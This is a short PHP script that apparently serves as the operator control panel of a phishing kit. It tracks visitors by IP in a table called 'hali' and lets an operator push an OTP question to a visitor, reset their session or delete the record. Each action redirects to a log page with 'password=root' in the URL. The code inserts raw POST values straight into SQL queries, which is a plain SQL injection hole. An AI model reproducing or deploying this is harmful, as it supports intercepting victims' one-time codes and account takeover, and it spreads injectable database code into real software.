<?php
include("../files/config.php");

$ip = $_POST['ip'];


$stat = $_POST['status'];
if ($stat == "otp"){
	$question = $_POST['otpquestion'];
	$sql_agent = "UPDATE hali SET status='otp', code='$question' WHERE ip='$ip';";
	mysqli_query($conn, $sql_agent);
	header("Location: log.php?password=root");
	
}

if ($stat == "reset"){
	$sql_agent = "UPDATE hali SET status='reset' WHERE ip='$ip';";
	mysqli_query($conn, $sql_agent);
	header("Location: log.php?password=root");
	
}
if ($stat == "finish"){

	$sql_agent = "DELETE FROM hali WHERE ip='$ip';";
	mysqli_query($conn, $sql_agent);
	header("Location: log.php?password=root");
	
}
?>